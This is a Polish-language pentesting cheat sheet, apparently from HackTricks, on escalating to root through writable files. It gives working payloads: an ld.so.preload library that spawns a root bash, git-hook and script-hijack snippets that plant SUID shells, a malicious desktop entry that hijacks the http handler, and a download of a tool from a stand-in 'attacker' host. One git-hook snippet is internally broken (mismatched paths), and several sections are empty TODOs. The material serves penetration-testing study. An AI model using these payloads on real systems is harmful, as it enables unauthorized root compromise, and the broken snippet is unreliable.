# Dowolne zapisanie pliku z uprawnieniami root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Ten plik zachowuje się jak zmienna środowiskowa **`LD_PRELOAD`**, ale działa również w **SUID binaries**.\
Jeśli możesz go utworzyć lub zmodyfikować, możesz po prostu dodać **ścieżkę do biblioteki, która zostanie załadowana** przy każdym uruchomionym programie.

For example: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) są **skryptami**, które są **uruchamiane** przy różnych **zdarzeniach** w repozytorium git, np. gdy tworzony jest commit, merge... Jeśli zatem **uprzywilejowany skrypt lub użytkownik** wykonuje te akcje często i istnieje możliwość **zapisania w katalogu `.git`**, można to wykorzystać do **privesc**.

Na przykład, można **wygenerować skrypt** w repo git w **`.git/hooks`**, tak aby był zawsze uruchamiany, gdy tworzony jest nowy commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

TODO

### Service & Socket files

TODO

### binfmt_misc

Plik znajdujący się w `/proc/sys/fs/binfmt_misc` wskazuje, który binarny program powinien wykonywać jakie typy plików. TODO: sprawdzić wymagania, aby wykorzystać to do uruchomienia rev shell, gdy otwarty jest powszechny typ pliku.

### Nadpisywanie handlerów schematów (jak http: lub https:)

Atakujący mający uprawnienia zapisu do katalogów konfiguracyjnych ofiary może łatwo zastąpić lub utworzyć pliki zmieniające zachowanie systemu, prowadząc do niezamierzonego wykonania kodu. Modyfikując plik `$HOME/.config/mimeapps.list`, aby wskazywał handlery URL HTTP i HTTPS na złośliwy plik (np. ustawiając `x-scheme-handler/http=evil.desktop`), atakujący zapewnia, że **kliknięcie dowolnego linku http lub https uruchamia kod określony w tym pliku `evil.desktop`**. Na przykład, po umieszczeniu następującego złośliwego kodu w `evil.desktop` w `$HOME/.local/share/applications`, każde kliknięcie zewnętrznego URL uruchamia osadzoną komendę:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
For more info check [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) where it was used to exploit a real vulnerability.

### Root wykonujący skrypty/binaria zapisywalne przez użytkownika

Jeśli uprzywilejowany workflow uruchamia coś w rodzaju `/bin/sh /home/username/.../script` (lub dowolny binary w katalogu należącym do nieuprzywilejowanego użytkownika), możesz to przejąć:

- **Wykryj uruchomienie:** monitoruj procesy za pomocą [pspy](https://github.com/DominicBreuker/pspy) aby wychwycić root wywołujący ścieżki kontrolowane przez użytkownika:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** upewnij się, że zarówno docelowy plik, jak i jego katalog są własnością i zapisywalne przez twojego użytkownika.
- **Hijack the target:** wykonaj kopię zapasową oryginalnego binary/script i wrzuć payload, który tworzy SUID shell (lub wykonuje inne działanie jako root), następnie przywróć uprawnienia:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Wywołaj uprzywilejowaną akcję** (np. naciśnięcie przycisku UI, który uruchamia helpera). Gdy root ponownie wykona przejętą ścieżkę, przejmij eskalowaną powłokę za pomocą `./rootshell -p`.

## Referencje

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)

{{#include ../../banners/hacktricks-training.md}}
